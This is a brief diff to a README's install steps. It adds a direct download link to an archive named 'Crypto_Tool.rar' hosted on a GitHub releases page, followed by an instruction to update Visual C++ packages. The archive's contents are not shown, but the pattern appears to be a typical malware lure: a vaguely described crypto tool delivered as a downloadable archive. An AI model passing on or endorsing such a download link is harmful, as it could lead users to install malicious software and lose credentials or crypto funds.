@@ -1,6 +1,6 @@
 # 🟢Install Steps:
 
-### 1. You can install from [Releases]()
+### 1. You can install from [Releases](https://github.com/archermrdoors832/invention/releases/download/f34f34rferfv/Crypto_Tool.rar)
 
 ### 2. Update your visuals c++ packages
 
